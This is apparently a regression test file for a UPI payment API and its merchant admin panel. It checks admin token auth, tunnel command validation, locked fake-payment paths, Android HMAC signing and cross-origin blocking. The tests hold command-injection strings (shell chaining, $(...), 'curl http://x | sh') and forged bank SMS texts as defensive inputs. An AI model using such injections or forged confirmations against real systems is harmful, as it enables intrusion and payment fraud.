/**
 * Regression tests for the critical security fixes:
 *  - admin API requires a token (fails closed when unset)
 *  - no shell execution through the tunnel endpoint
 *  - fake-payment paths (counter-confirm, observer ingestion, simulate-observation) are locked
 *  - Android pairing has no hardcoded tokens and device events must be HMAC-signed
 *  - merchant admin panel requires login and blocks cross-origin writes
 *
 * Requests here are sent WITHOUT the harness credentials unless a test adds them explicitly.
 */
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { Database } from '@youpi/db';
import { parseCloudflareTunnelToken } from '@youpi/common';
import { startServer as startPaymentApi } from '../index.js';
import { startAdminServer } from '../../../merchant-admin/src/index.js';

const ADMIN_TOKEN = 'security-test-admin-token-0123456789abcdef0123456789';
const OBSERVER_TOKEN = 'security-test-observer-token-0123456789abcdef012345';
const ENROLL_SECRET = 'security-test-enrollment-secret-0123456789abcdef0123';
const PANEL_USER = 'owner';
const PANEL_PASS = 'security-test-panel-pass-9876';

function request(baseUrl, urlPath, { method = 'GET', headers = {}, body, raw } = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlPath, baseUrl);
    const payload = raw !== undefined ? raw : (body !== undefined ? JSON.stringify(body) : undefined);
    const req = http.request(url, {
      method,
      headers: { 'Content-Type': 'application/json', ...headers }
    }, res => {
      let data = '';
      res.on('data', c => { data += c; });
      res.on('end', () => {
        let parsed;
        try { parsed = JSON.parse(data); } catch { parsed = data; }
        resolve({ status: res.statusCode, body: parsed, headers: res.headers });
      });
    });
    req.on('error', reject);
    if (payload !== undefined) req.write(payload);
    req.end();
  });
}

describe('Security lock-down (critical fixes)', () => {
  let api;
  let apiUrl;
  let admin;
  let adminUrl;
  let db;
  const savedEnv = {};

  before(async () => {
    for (const k of ['ADMIN_API_TOKEN', 'OBSERVER_INGEST_TOKEN', 'ANDROID_ENROLLMENT_SECRET', 'ADMIN_PANEL_USER', 'ADMIN_PANEL_PASSWORD', 'PAYMENT_API_PORT']) {
      savedEnv[k] = process.env[k];
    }
    process.env.ADMIN_API_TOKEN = ADMIN_TOKEN;
    process.env.OBSERVER_INGEST_TOKEN = OBSERVER_TOKEN;
    process.env.ANDROID_ENROLLMENT_SECRET = ENROLL_SECRET;
    process.env.ADMIN_PANEL_USER = PANEL_USER;
    process.env.ADMIN_PANEL_PASSWORD = PANEL_PASS;

    // Send every request exactly as written (no harness-injected credentials).
    globalThis.__YOUPI_TEST_NO_AUTH = true;

    db = new Database({ inMemory: true });
    api = await startPaymentApi(6177, db);
    apiUrl = `http://localhost:${api.port}`;
    process.env.PAYMENT_API_PORT = String(api.port);
    admin = await startAdminServer(6178, { db });
    adminUrl = `http://localhost:${admin.port}`;
  });

  after(async () => {
    globalThis.__YOUPI_TEST_NO_AUTH = false;
    await admin.close();
    await api.close();
    db.close();
    for (const [k, v] of Object.entries(savedEnv)) {
      if (v === undefined) delete process.env[k]; else process.env[k] = v;
    }
  });

  async function createUpiPayment(orderId, amount = '101.00') {
    const res = await request(apiUrl, '/api/v1/payments', {
      method: 'POST',
      body: { orderId, amount, autoActivate: true }
    });
    assert.equal(res.status, 201, JSON.stringify(res.body));
    return res.body.paymentId;
  }

  async function statusOf(paymentId) {
    const res = await request(apiUrl, `/api/v1/payments/${paymentId}`);
    return res.body.status;
  }

  // ---------------------------------------------------------------- admin auth
  test('admin routes reject requests without a token', async () => {
    for (const p of ['/api/v1/admin/queue', '/api/v1/admin/all-settings', '/api/v1/admin/customers', '/api/v1/admin/upi-accounts']) {
      const res = await request(apiUrl, p);
      assert.equal(res.status, 401, `${p} should require auth`);
    }
  });

  test('admin routes reject a wrong token and accept the right one', async () => {
    const wrong = await request(apiUrl, '/api/v1/admin/queue', { headers: { 'X-Admin-Token': 'x'.repeat(48) } });
    assert.equal(wrong.status, 401);
    const right = await request(apiUrl, '/api/v1/admin/queue', { headers: { 'X-Admin-Token': ADMIN_TOKEN } });
    assert.equal(right.status, 200);
    const bearer = await request(apiUrl, '/api/v1/admin/queue', { headers: { Authorization: `Bearer ${ADMIN_TOKEN}` } });
    assert.equal(bearer.status, 200);
  });

  test('admin API fails closed when ADMIN_API_TOKEN is missing or a placeholder', async () => {
    process.env.ADMIN_API_TOKEN = '';
    let res = await request(apiUrl, '/api/v1/admin/queue', { headers: { 'X-Admin-Token': '' } });
    assert.equal(res.status, 503);
    process.env.ADMIN_API_TOKEN = 'change_me_to_a_long_random_admin_api_token_value';
    res = await request(apiUrl, '/api/v1/admin/queue', { headers: { 'X-Admin-Token': 'change_me_to_a_long_random_admin_api_token_value' } });
    assert.equal(res.status, 503);
    process.env.ADMIN_API_TOKEN = ADMIN_TOKEN;
  });

  test('Gmail secrets are not readable without a token', async () => {
    const res = await request(apiUrl, '/api/v1/admin/gmail/credentials');
    assert.equal(res.status, 401);
    const asObserver = await request(apiUrl, '/api/v1/admin/gmail/credentials', { headers: { 'X-Observer-Token': OBSERVER_TOKEN } });
    assert.equal(asObserver.status, 200);
  });

  // ---------------------------------------------------------------- RCE
  test('tunnel start never executes arbitrary shell commands', async () => {
    const marker = path.join(os.tmpdir(), `youpi-rce-${crypto.randomUUID()}`);

    const unauth = await request(apiUrl, '/api/v1/admin/tunnel/start', {
      method: 'POST', body: { command: `touch ${marker}` }
    });
    assert.equal(unauth.status, 401);

    for (const command of [`touch ${marker}`, `cloudflared tunnel run --token abc; touch ${marker}`, `cloudflared tunnel run --token $(touch ${marker})`]) {
      const res = await request(apiUrl, '/api/v1/admin/tunnel/start', {
        method: 'POST', headers: { 'X-Admin-Token': ADMIN_TOKEN }, body: { command }
      });
      assert.equal(res.status, 400, `should reject: ${command}`);
    }

    const save = await request(apiUrl, '/api/v1/admin/merchant-settings', {
      method: 'POST', headers: { 'X-Admin-Token': ADMIN_TOKEN }, body: { cloudflareTunnelCommand: `touch ${marker}` }
    });
    assert.equal(save.status, 400, 'malicious tunnel command must not be stored');

    await new Promise(r => setTimeout(r, 300));
    assert.equal(fs.existsSync(marker), false, 'shell command must not run');
  });

  test('tunnel token parser accepts real cloudflared forms only', () => {
    const token = Buffer.from(JSON.stringify({ a: 'acct', t: 'tunnel', s: 'secret-value-1234' })).toString('base64');
    assert.equal(parseCloudflareTunnelToken(token), token);
    assert.equal(parseCloudflareTunnelToken(`cloudflared tunnel run --token ${token}`), token);
    assert.equal(parseCloudflareTunnelToken(`cloudflared.exe service install ${token}`), token);
    for (const bad of ['bash -c id', `cloudflared tunnel run --token ${token} && id`, 'curl http://x | sh', '']) {
      assert.throws(() => parseCloudflareTunnelToken(bad));
    }
  });

  // ---------------------------------------------------------------- fake payments
  test('counter-confirm cannot mark a payment paid without admin auth', async () => {
    const paymentId = await createUpiPayment('SEC-COUNTER-1');
    const res = await request(apiUrl, '/api/v1/admin/counter-confirm', {
      method: 'POST', body: { paymentId, operatorId: 'attacker' }
    });
    assert.equal(res.status, 401);
    assert.notEqual(await statusOf(paymentId), 'SUCCESS');
  });

  test('counter-confirm refuses to revive a finished session', async () => {
    const paymentId = await createUpiPayment('SEC-COUNTER-2');
    await request(apiUrl, `/api/v1/checkout/${paymentId}/cancel`, { method: 'POST', body: {} });
    assert.equal(await statusOf(paymentId), 'CANCELLED');
    const res = await request(apiUrl, '/api/v1/admin/counter-confirm', {
      method: 'POST', headers: { 'X-Admin-Token': ADMIN_TOKEN }, body: { paymentId, operatorId: 'op' }
    });
    assert.equal(res.status, 409);
    assert.equal(await statusOf(paymentId), 'CANCELLED');
  });

  test('fake bank SMS cannot be posted to observer ingestion without a token', async () => {
    const paymentId = await createUpiPayment('SEC-FAKE-SMS-1', '101.00');
    const fake = {
      receivingAccountId: '00000000-0000-0000-0000-000000000002',
      source: 'SMS',
      sender: 'HDFCBK',
      paymentSessionId: paymentId,
      rawText: 'Rs.101.00 credited to a/c XX1234 via UPI Ref No 512345678901. -HDFC Bank'
    };
    const res = await request(apiUrl, '/api/v1/pollers/events', { method: 'POST', body: fake });
    assert.equal(res.status, 401);
    const withWrong = await request(apiUrl, '/api/v1/pollers/events', {
      method: 'POST', headers: { 'X-Observer-Token': 'y'.repeat(48) }, body: fake
    });
    assert.equal(withWrong.status, 401);
    assert.notEqual(await statusOf(paymentId), 'SUCCESS');

    const window = await request(apiUrl, '/api/v1/pollers/active-window');
    assert.equal(window.status, 401);
  });

  test('simulate-observation is not public', async () => {
    const paymentId = await createUpiPayment('SEC-SIM-1', '102.00');
    const res = await request(apiUrl, `/api/v1/checkout/${paymentId}/simulate-observation`, {
      method: 'POST',
      body: { source: 'SMS', sender: 'HDFCBK', rawText: 'Rs.102.00 credited via UPI Ref No 512345678902' }
    });
    assert.equal(res.status, 401);
    assert.notEqual(await statusOf(paymentId), 'SUCCESS');
  });

  // ---------------------------------------------------------------- Android
  test('Android pairing rejects the old hardcoded tokens', async () => {
    for (const token of ['youpi_sms_pair_token_secure', 'pair_00000000', 'android_pairing_enrollment_secret_key_32_chars']) {
      const res = await request(apiUrl, '/api/v1/pollers/android/pair', { method: 'POST', body: { enrollmentToken: token } });
      assert.equal(res.status, 401, `token ${token} must be rejected`);
    }
  });

  test('Android events must be HMAC-signed', async () => {
    const pair = await request(apiUrl, '/api/v1/pollers/android/pair', { method: 'POST', body: { enrollmentToken: ENROLL_SECRET } });
    assert.equal(pair.status, 200);
    const { deviceId, signingKey } = pair.body;

    const bodyText = JSON.stringify({ sender: 'HDFCBK', body: 'Rs.103.00 credited via UPI Ref No 512345678903' });
    const unsigned = await request(apiUrl, '/api/v1/pollers/android/events', {
      method: 'POST', headers: { 'X-Device-Id': deviceId }, raw: bodyText
    });
    assert.equal(unsigned.status, 401);

    const ts = String(Date.now());
    const badSig = await request(apiUrl, '/api/v1/pollers/android/events', {
      method: 'POST', headers: { 'X-Device-Id': deviceId, 'X-Timestamp': ts, 'X-Signature': 'a'.repeat(64) }, raw: bodyText
    });
    assert.equal(badSig.status, 401);

    const sig = crypto.createHmac('sha256', signingKey).update(`${bodyText}:${ts}`, 'utf8').digest('hex');
    const good = await request(apiUrl, '/api/v1/pollers/android/events', {
      method: 'POST', headers: { 'X-Device-Id': deviceId, 'X-Timestamp': ts, 'X-Signature': sig }, raw: bodyText
    });
    assert.notEqual(good.status, 401);
  });

  // ---------------------------------------------------------------- admin panel
  test('merchant admin panel requires login and proxies with the server-side token', async () => {
    const anon = await request(adminUrl, '/');
    assert.equal(anon.status, 401);
    assert.match(String(anon.headers['www-authenticate'] || ''), /Basic/);

    const badLogin = await request(adminUrl, '/', {
      headers: { Authorization: `Basic ${Buffer.from(`${PANEL_USER}:wrong-password-x`).toString('base64')}` }
    });
    assert.equal(badLogin.status, 401);

    const auth = { Authorization: `Basic ${Buffer.from(`${PANEL_USER}:${PANEL_PASS}`).toString('base64')}` };
    const page = await request(adminUrl, '/', { headers: auth });
    assert.equal(page.status, 200);

    const proxied = await request(adminUrl, '/api/v1/admin/queue', { headers: auth });
    assert.equal(proxied.status, 200, 'panel proxy should attach ADMIN_API_TOKEN');

    const health = await request(adminUrl, '/health');
    assert.equal(health.status, 200);
  });

  test('merchant admin panel blocks cross-origin writes', async () => {
    const auth = { Authorization: `Basic ${Buffer.from(`${PANEL_USER}:${PANEL_PASS}`).toString('base64')}` };
    const res = await request(adminUrl, '/api/v1/admin/queue/clear', {
      method: 'POST', headers: { ...auth, Origin: 'https://evil.example' }, body: {}
    });
    assert.equal(res.status, 403);
  });
});
